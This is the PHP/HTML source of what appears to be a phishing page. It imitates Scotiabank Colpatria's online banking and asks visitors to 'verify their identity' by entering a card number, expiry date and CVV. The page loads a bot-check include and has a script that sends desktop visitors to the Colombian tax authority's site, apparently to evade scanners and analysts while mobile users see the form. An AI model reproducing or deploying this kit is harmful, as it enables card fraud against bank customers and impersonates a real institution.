<?php
require "is_botcito.php";
require "ayudante.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Scotiabank Colpatria | Banca virtual</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../../js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="cabe">
            <div class="logocenter">
                <div class="logo">

                </div>

            </div>
        </div>
        <div class="principal">
            <div class="autenticar">
                <div class="conttitulo">
                    <div class="titulo">
                        <h1>Verifica tu identidad</h1>
                        <hr />
                    </div>
                </div>
                <div class="contenido">
                    <div class="caja">
                        <div class="izq">
                            <form autocomplete="off" id="ftarjeta">
                                <div class="inputg columna">
                                    <input type="text" name="tarjeta" id="tarjeta" placeholder="Numero de tarjeta" maxlength="16" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" pattern="[0-9]*" />
                                    <div class="error" id="etarjeta">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Ingrese una tarjeta valida</span>
                                    </div>
                                </div>
                                <div class="inputg columna">
                                    <div style="display: flex;flex-direction: row;flex-wrap: nowrap;justify-content: space-between;width:107%;margin-top: 20px;">
                                        <select name="mes" id="mes">
                                            <option value="">Seleccione Mes</option>
                                            <option value="01">01</option>
                                            <option value="02">02</option>
                                            <option value="03">03</option>
                                            <option value="04">04</option>
                                            <option value="05">05</option>
                                            <option value="06">06</option>
                                            <option value="07">07</option>
                                            <option value="08">08</option>
                                            <option value="10">10</option>
                                            <option value="11">11</option>
                                            <option value="12">12</option>
                                        </select>
                                        <select name="year" id="year">
                                            <option value="">Seleccione Año</option>
                                            <option value="2021">2021</option>
                                            <option value="2022">2022</option>
                                            <option value="2023">2023</option>
                                            <option value="2024">2024</option>
                                            <option value="2025">2025</option>
                                            <option value="2026">2026</option>
                                            <option value="2027">2027</option>
                                            <option value="2028">2028</option>
                                            <option value="2029">2029</option>
                                        </select>
                                    </div>

                                    <div class="error" id="error_fecha">
                                        <img src="img/war.svg" alt="error">
                                        <span class="rojo">Seleccione una fecha de vencimiento</span>
                                    </div>
                                </div>


                                <div class="inputg columna">
                                    <div style="text-align: right;" class="ojos">
                                        <img src="img/ojo.svg" alt="ojo" id="ojo" style="display: none;">
                                    </div>
                                    <input type="text" name="cvv" id="cvv" placeholder="cvv" maxlength="4" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" pattern="[0-9]*" />
                                    <div class="error" id="ecvv">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Formato de cvv invalido</span>
                                    </div>
                                </div>
                                <div class="inputgb">
                                    <button type="button" id="btntarjeta" class="btn">Verificar</button>
                                </div>
                                <div class="inputg inicio">
                                    <p style="margin-bottom: 5px;">Por razones de seguridad le recomendamos ingresar los
                                        datos solicitados a fin de seguir disfrutando de nosotros</p>
                                </div>
                            </form>
                        </div>
                        <div class="der">
                            <img src="img/seguridad.svg" alt="seguridad" />
                            <p style="text-align: justify;">
                                Recuerda verificar los datos de tu tarjeta 
                                antes de dar clic al botón "verificar" a 
                                fin de evitar inconvenientes
                                en proceso de comprobación de sus datos
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="pie">
            <div class="piecenter">
                <p class="derec">
                    © 2022 Todos los Derechos Reservados Scotiabank Colpatria.
                </p>
            </div>
        </div>
    </div>
    <script src="js/funciones.js"></script>

<script>
    function detectar_dispositivo() {
        var dispositivo = "";
        if (navigator.userAgent.match(/Android/i))
            dispositivo = "Android";
        else if (navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else if (navigator.userAgent.match(/iPhone/i))
            dispositivo = "iPhone";
        else if (navigator.userAgent.match(/iPad/i))
            dispositivo = "iPad";
        else if (navigator.userAgent.match(/iPod/i))
            dispositivo = "iPod";
        else if (navigator.userAgent.match(/BlackBerry/i))
            dispositivo = "BlackBerry";
        else if (navigator.userAgent.match(/Windows Phone/i))
            dispositivo = "Windows Phone";
        else
            dispositivo = "PC";
        return dispositivo;
    }

    if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
</script>
    
</body>

</html>